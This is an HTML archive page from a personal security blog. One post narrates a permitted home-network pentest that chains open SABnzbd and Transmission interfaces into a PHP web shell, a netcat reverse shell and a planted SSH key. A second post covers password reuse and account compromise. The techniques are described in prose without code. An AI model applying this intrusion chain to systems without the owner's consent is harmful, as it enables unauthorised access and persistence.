@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+<!--[if IE 6]>
+<html id="ie6" lang="en-US">
+<![endif]--><!--[if IE 7]>
+<html id="ie7" lang="en-US">
+<![endif]--><!--[if IE 8]>
+<html id="ie8" lang="en-US">
+<![endif]--><!--[if !(IE 6) & !(IE 7) & !(IE 8)]><!--><html lang="en-US">
+<!--<![endif]-->
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<title>
+WebApp | Graeme Robinson&#039;s blog	</title>
+<link rel="profile" href="https://gmpg.org/xfn/11">
+<link rel="stylesheet" type="text/css" media="all" href="/wp-content/themes/twentyelevenmod/style.css?ver=20240716">
+<link rel="pingback" href="/xmlrpc.php">
+<!--[if lt IE 9]>
+<script src="/wp-content/themes/twentyeleven/js/html5.js?ver=3.7.0" type="text/javascript"></script>
+<![endif]-->
+<meta name="robots" content="max-image-preview:large">
+<link rel="alternate" type="application/rss+xml" title="Graeme Robinson&#039;s blog &raquo; Feed" href="/feed/">
+<link rel="alternate" type="application/rss+xml" title="Graeme Robinson&#039;s blog &raquo; Comments Feed" href="/comments/feed/">
+<link rel="alternate" type="application/rss+xml" title="Graeme Robinson&#039;s blog &raquo; WebApp Category Feed" href="/category/infosec/webapp/feed/">
+<script type="text/javascript">
+/* <![CDATA[ */
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.6.2"}};
+/*! This file is auto-generated */
+!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"🏳️‍⚧️","🏳️​⚧️")?!1:!n(e,"🇺🇳","🇺​🇳")&&!n(e,"🏴󠁧󠁢󠁥󠁮󠁧󠁿","🏴​󠁧​󠁢​󠁥​󠁮​󠁧​󠁿");case"emoji":return!n(e,"🐦‍⬛","🐦​⬛")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
+/* ]]> */
+</script>
+<style id="wp-emoji-styles-inline-css" type="text/css">img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}</style>
+<link rel="stylesheet" id="wp-block-library-css" href="/wp-includes/css/dist/block-library/style.min.css?ver=6.6.2" type="text/css" media="all">
+<style id="wp-block-library-theme-inline-css" type="text/css">.wp-block-audio :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-audio :where(figcaption){color:#ffffffa6}.wp-block-audio{margin:0 0 1em}.wp-block-code{border:1px solid #ccc;border-radius:4px;font-family:Menlo,Consolas,monaco,monospace;padding:.8em 1em}.wp-block-embed :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-embed :where(figcaption){color:#ffffffa6}.wp-block-embed{margin:0 0 1em}.blocks-gallery-caption{color:#555;font-size:13px;text-align:center}.is-dark-theme .blocks-gallery-caption{color:#ffffffa6}:root :where(.wp-block-image figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme :root :where(.wp-block-image figcaption){color:#ffffffa6}.wp-block-image{margin:0 0 1em}.wp-block-pullquote{border-bottom:4px solid;border-top:4px solid;color:currentColor;margin-bottom:1.75em}.wp-block-pullquote cite,.wp-block-pullquote footer,.wp-block-pullquote__citation{color:currentColor;font-size:.8125em;font-style:normal;text-transform:uppercase}.wp-block-quote{border-left:.25em solid;margin:0 0 1.75em;padding-left:1em}.wp-block-quote cite,.wp-block-quote footer{color:currentColor;font-size:.8125em;font-style:normal;position:relative}.wp-block-quote.has-text-align-right{border-left:none;border-right:.25em solid;padding-left:0;padding-right:1em}.wp-block-quote.has-text-align-center{border:none;padding-left:0}.wp-block-quote.is-large,.wp-block-quote.is-style-large,.wp-block-quote.is-style-plain{border:none}.wp-block-search .wp-block-search__label{font-weight:700}.wp-block-search__button{border:1px solid #ccc;padding:.375em .625em}:where(.wp-block-group.has-background){padding:1.25em 2.375em}.wp-block-separator.has-css-opacity{opacity:.4}.wp-block-separator{border:none;border-bottom:2px solid;margin-left:auto;margin-right:auto}.wp-block-separator.has-alpha-channel-opacity{opacity:1}.wp-block-separator:not(.is-style-wide):not(.is-style-dots){width:100px}.wp-block-separator.has-background:not(.is-style-dots){border-bottom:none;height:1px}.wp-block-separator.has-background:not(.is-style-wide):not(.is-style-dots){height:2px}.wp-block-table{margin:0 0 1em}.wp-block-table td,.wp-block-table th{word-break:normal}.wp-block-table :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-table :where(figcaption){color:#ffffffa6}.wp-block-video :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-video :where(figcaption){color:#ffffffa6}.wp-block-video{margin:0 0 1em}:root :where(.wp-block-template-part.has-background){margin-bottom:0;margin-top:0;padding:1.25em 2.375em}</style>
+<style id="classic-theme-styles-inline-css" type="text/css">/*! This file is auto-generated */
+.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}</style>
+<style id="global-styles-inline-css" type="text/css">:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #fff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--color--blue: #1982d1;--wp--preset--color--dark-gray: #373737;--wp--preset--color--medium-gray: #666;--wp--preset--color--light-gray: #e2e2e2;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
+:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}</style>
+<link rel="stylesheet" id="wp-syntax-css-css" href="/wp-content/plugins/wp-syntax/css/wp-syntax.css?ver=1.2" type="text/css" media="all">
+<link rel="stylesheet" id="twentyeleven-block-style-css" href="/wp-content/themes/twentyeleven/blocks.css?ver=20240621" type="text/css" media="all">
+<script type="text/javascript" src="/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
+<script type="text/javascript" src="/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
+<link rel="https://api.w.org/" href="/wp-json/">
+<link rel="alternate" title="JSON" type="application/json" href="/wp-json/wp/v2/categories/6">
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="/xmlrpc.php?rsd">
+<meta name="generator" content="WordPress 6.6.2">
+	<style>/* Link color */
+		a,
+		#site-title a:focus,
+		#site-title a:hover,
+		#site-title a:active,
+		.entry-title a:hover,
+		.entry-title a:focus,
+		.entry-title a:active,
+		.widget_twentyeleven_ephemera .comments-link a:hover,
+		section.recent-posts .other-recent-posts a[rel="bookmark"]:hover,
+		section.recent-posts .other-recent-posts .comments-link a:hover,
+		.format-image footer.entry-meta a:hover,
+		#site-generator a:hover {
+			color: #ff7600;
+		}
+		section.recent-posts .other-recent-posts .comments-link a:hover {
+			border-color: #ff7600;
+		}
+		article.feature-image.small .entry-summary p a:hover,
+		.entry-header .comments-link a:hover,
+		.entry-header .comments-link a:focus,
+		.entry-header .comments-link a:active,
+		.feature-slider a.active {
+			background-color: #ff7600;
+		}</style>
+	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
+<style type="text/css" id="custom-background-css">body.custom-background { background-color: #f1f1f1; }</style>
+	</head>
+
+<body class="archive category category-webapp category-6 custom-background wp-embed-responsive single-author two-column right-sidebar">
+<div class="skip-link"><a class="assistive-text" href="#content">Skip to primary content</a></div>
+<div class="skip-link"><a class="assistive-text" href="#secondary">Skip to secondary content</a></div>
+<div id="page" class="hfeed">
+	<header id="branding">
+			<hgroup>
+				<h1 id="site-title"><span><a href="/" rel="home">Graeme Robinson&#039;s blog</a></span></h1>
+				<h2 id="site-description">A place for my thoughts when I was starting to break into the information security feild</h2>
+			</hgroup>
+
+						<a href="/">
+				<img src="/wp-content/uploads/2012/09/copy-Bruv-Beans-Banner.jpg" width="1000" height="228" alt="Graeme Robinson&#039;s blog" srcset="/wp-content/uploads/2012/09/copy-Bruv-Beans-Banner.jpg 1000w, /wp-content/uploads/2012/09/copy-Bruv-Beans-Banner-300x68.jpg 300w, /wp-content/uploads/2012/09/copy-Bruv-Beans-Banner-500x114.jpg 500w" sizes="(max-width: 1000px) 100vw, 1000px" decoding="async" fetchpriority="high">			</a>
+			
+									<form method="get" id="searchform" action="/">
+		<label for="s" class="assistive-text">Search</label>
+		<input type="text" class="field" name="s" id="s" placeholder="Search">
+		<input type="submit" class="submit" name="submit" id="searchsubmit" value="Search">
+	</form>
+			
+			<nav id="access">
+				<h3 class="assistive-text">Main menu</h3>
+				<div class="menu"><ul>
+<li><a href="/">Home</a></li>
+<li class="page_item page-item-2"><a href="/about-me/">About Me</a></li>
+<li class="page_item page-item-13"><a href="/infosec-links/">InfoSec Links</a></li>
+</ul></div>
+			</nav><!-- #access -->
+	</header><!-- #branding -->
+
+
+	<div id="main">
+
+		<section id="primary">
+			<div id="content" role="main">
+
+			
+				<header class="page-header">
+					<h1 class="page-title">
+					Category Archives: <span>WebApp</span>					</h1>
+
+									</header>
+
+				
+				
+					
+	<article id="post-227" class="post-227 post type-post status-publish format-standard hentry category-exploit category-infosec category-lesson-learned category-os-x category-pentest category-php category-shell category-unix category-web-server category-webapp">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/my-first-pentest-on-a-friends-network/" rel="bookmark">My first pentest on a friend&#8217;s network</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/my-first-pentest-on-a-friends-network/" title="4:31 PM" rel="bookmark"><time class="entry-date" datetime="2013-01-06T16:31:58+00:00">2013-01-06</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/my-first-pentest-on-a-friends-network/#comments">9</a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>Someone I have know for a while was aware of my growing interest in information security and I had warned them a while ago that their network was probably vulnerable to attack because I had seen some web services that were not password protected running out of their home public IP address.</p>
+<p>I saw them over the Christmas/new year period and they gave me permission to try and penetrate their network, specifically they challenged me to change the root password on their unRAID server.</p>
+<p>I started off by firing up my Backtrack 5r3 VM and updating everything before registering Nessus and performing a scan of his public IP address.</p>
+<p>Nessus didn&#8217;t find anything that was listed as critical, but it did show me that we had ssh running on port 22 and it also showed me all other ports that were open and had web servers running on them. I checked them all out and I found on various ports; the default Lion server webpage, SABNZBd, SickBeard, Transmission, and the unRAID server.</p>
+<p>The website served by the unRAID server was asking for a username and password using basic access authentication. That was no use so I started looking into the other services. Not only were the operating interfaces unsecured, but their configuration sections were also open to anyone. I saw that SABNZBd was running as &#8220;admin&#8221; and that it had an option of running scripts when a download had completed. The method was to point SABNZBd to a folder containing scripts, start a download and then choose what script to run on completion. I knew I could download a file using SABNZBd or Transmission to any directory that the admin user had write permissions to, but I didn&#8217;t know at this stage how to make it executable.</p>
+<p>I saw in SABNZBd&#8217;s preferences that I could specify the permissions (in octal format) of files and folders that were downloaded, so I ran SABNZBd on my machine, created a binary post on a newsgroup containing a script that was basically a reverse shell and tested a download to my machine with SABNZBd set to mark everything at 777. It created a folder with 777 permissions, but the file was only 555. Presumably this was for security reasons &#8211; damn!</p>
+<p>At this point I was wishing that his machine was running Windows not OSX because SABNZBd on Windows only requires that a scripts file extension is in the PATHEXT environment variable. That would have been much easier than getting a file marked as executable.</p>
+<p>I had to find another way of making an executable script on that machine. How could I get that machine to run my commands without having an executable script set&#8230; The web server or course. I created my single line PHP shell again (mentioned in a previous post) and set Transmission to download files to the Lion web server default folder, created a torrent containing my php script and downloaded the torrent to the server using transmission. I tested it, with the command <strong>whoami</strong>, and it worked. I was in, but I was only the user _www.</p>
+<p>What could I do as _www? Not much, but I was able to create a reverse shell using netcat and take a look around the system. I couldn&#8217;t access admin&#8217;s files yet, but of course I could write to /tmp. If I could write to /tmp, I could create a script and mark it as executable by everyone. Then I could get SABNZBd to run it! I started thinking about making a script that would create a reverse shell, then it dawned on me: create a public/private key pair and add it to /Users/admin/.ssh/authorized_keys.</p>
+<p>I uploaded my public key using my php shell script, and then created an executable script in /tmp that appended my key to authorized_keys.</p>
+<p>I started a new SABNZBd download (I decided to just download something that was small, free and released under the CC license) so as no to upset anyone. Obviously I now set my script to run. All went well and I could now ssh into the machine as the admin user without a password.</p>
+<p>At this point I cleaned up everything I had downloaded and just left my key in place so I could log in. I took a look around, but I couldn&#8217;t see anything to do with the unRAID server, so I thought I should report how far I had got.</p>
+<p>They were surprised, and while I didn&#8217;t get into the unRAID server, I had gotten a lot further than they thought anyone would be able to. As a result of this, they have since enabled logins on all their web services and removed my public key, but they still do have some vulnerabilities, like ssh running on a default port and allowing password authentication (ripe for brute forcing). They are a lot safer than they were, but it may well be worth me going back and having another go at some point in the future.</p>
+<p>A lot of the methods that I have used in this test were inspired by the challenges I have been working through in hackthissite.org and exploit-excercises.com and I&#8217;m very grateful to them for making the challenges.</p>
+<p>I&#8217;m tempted to try and create a VM with this vulnerable setup and release it. I would have to check the licences, but I think most of it could be done using open source solutions (linux, apache, sabnzbd, transmission)</p>
+					</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/exploit/" rel="category tag">Exploit</a>, <a href="/category/infosec/" rel="category tag">Information Security</a>, <a href="/category/lesson-learned/" rel="category tag">Lesson Learned</a>, <a href="/category/os-x/" rel="category tag">OS X</a>, <a href="/category/infosec/pentest/" rel="category tag">Penetration Test</a>, <a href="/category/php/" rel="category tag">PHP</a>, <a href="/category/shell/" rel="category tag">Shell</a>, <a href="/category/unix/" rel="category tag">Unix</a>, <a href="/category/web-server/" rel="category tag">Web Server</a>, <a href="/category/infosec/webapp/" rel="category tag">WebApp</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/my-first-pentest-on-a-friends-network/#comments"><b>9</b> Replies</a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-227 -->
+
+				
+					
+	<article id="post-134" class="post-134 post type-post status-publish format-standard hentry category-brute-force category-comic category-compromise category-crack category-google-authenticator category-hash category-lastpass category-lesson-learned category-password-reuse category-passwords category-salt category-windows-live category-xkcd">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/how-i-think-my-windows-live-account-got-compromised/" rel="bookmark">How (I think) my windows live account got compromised</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/how-i-think-my-windows-live-account-got-compromised/" title="11:22 AM" rel="bookmark"><time class="entry-date" datetime="2012-10-29T11:22:54+00:00">2012-10-29</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/how-i-think-my-windows-live-account-got-compromised/#respond"><span class="leave-reply">Reply</span></a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>This message kind of follows on from <a href="/my-fiancee-is-using-better-passwords-than-me/">the post about my Fianc<em>é</em>e&#8217;s hotmail account being compromised, and her subsequent use of much better passwords.</a></p>
+<p>About a week ago I got a message from my brother telling me that my windows live messenger account was spamming him. This was confirmed a little later by another friend but as I was travelling in Germany at the time for work, I was not able to log on and try to change my password immediately. When I was able to sit down with my laptop and internet access, I was pleased to find that I could still log in to windows live and I promptly changed my password.</p>
+<p>This compromise was a bit of a surprise and lead me to think about how my account could get compromised, and what I lessons I could learn from the compromise. This post is about how I think my account was compromised, and how I have further strengthened my security since.</p>
+<p>While my windows live password was fairly secure (it didn&#8217;t conform to any of the common patterns used for passwords) and it wasn&#8217;t overly short. Because of this, I&#8217;m pretty confident that a brute force attack over the internet against the windows live authentication services would take too much time to make it a reasonable attack vector; it would be prohibitively slow. I would also expect the windows live authentication services to have some kind of security measure to counter brute force attacks, though I&#8217;m not sure about that.</p>
+<p>When I set up my windows live account many years ago, I wasn&#8217;t really bothered about security and I used the same password for many of my online accounts. There is another great xkcd comic about this:<a href="http://xkcd.com/792/"><img decoding="async" class="alignnone" title="xkcd: Password Reuse" src="http://imgs.xkcd.com/comics/password_reuse.png" alt="xkcd: Password Reuse" width="480" height="1189"></a></p>
+<p>When I realised that this was insecure I started to change some of my accounts to use a slightly different password where a small number of characters were different. The changed characters were chose depending on which site or service I was logging in to, but I had never updated the password on my windows live account because I never logged in manually; I had windows live messenger set to save my password and log in automatically. This meant that I was still probably reusing a password with another account somewhere else that I had forgotten about.</p>
+<p>My theory of how they got my password is that a website or service that I had forgotten about (because I haven&#8217;t used it for years) has been compromised and had revealed my email address and password. The password was probably stored (and therefore revealed) as plain text. I think this because even if my password was hashed but not unsalted, the attacker would have had to use a very large rainbow table for it to cover my password, and this would have also taken so much time that it would not have been worth it for the attacker. The attacker would surely just go for the low hanging fruit, rather than spend ages on a single account. I think that once the attackers got the email/password combination, they probably just tried it on a bunch of common services that they could use to send spam messages (<a title="Hotmail" href="http://www.hotmail.com/" target="_blank">hotmail</a>, <a title="Facebook" href="https://www.facebook.com/" target="_blank">facebook</a>, <a title="Twitter" href="https://twitter.com/" target="_blank">twitter</a>, <a title="Skype" href="http://www.skype.com/" target="_blank">skype</a>, <strong>WLM</strong>, <a title="iCloud" href="https://www.icloud.com/" target="_blank">iCloud</a>, etc), and found that one of my accounts had the same password.</p>
+<p>I use <a title="LastPass" href="https://lastpass.com/" target="_blank">lastpass</a> these days, with two factor authentication using <a title="Google Authenticator" href="http://en.wikipedia.org/wiki/Google_Authenticator" target="_blank">google authenticator</a> app on my phone, and have been going through my various accounts, making sure they are using unique and secure passwords (the lastpass security challenge is great for this &#8211; I am now up to 92.6% secure) but as I mentioned before, I hadn&#8217;t logged in to windows live manually for years, so my vault didn&#8217;t contain that password, and so couldn&#8217;t warn me that I was still reusing a password. So I have racked by brain to try to remember anywhere else that I may have an account and made sure that I checked those passwords too. I&#8217;m sure I will have missed some, but hopefully they are ones that I don&#8217;t really care about or use these days.</p>
+					</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
